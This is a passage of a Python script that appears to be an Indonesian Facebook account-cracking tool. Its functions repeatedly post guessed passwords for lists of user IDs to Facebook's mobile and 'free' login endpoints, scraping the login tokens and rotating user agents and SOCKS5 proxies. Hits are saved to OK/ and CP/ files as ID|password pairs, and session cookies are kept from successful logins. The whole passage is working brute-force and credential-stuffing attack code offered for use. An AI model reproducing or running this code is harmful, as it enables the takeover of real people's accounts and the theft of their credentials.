'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent':ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=950160105669643&auth_token=ac271a0b69b219581ad260574e470ce4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&refsrc=deprecated&app_id=950160105669643&cancel=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE FREE]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Reguler Free.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE LAWAK V1]--------------------#

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/BrayennnXD')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	Login()
	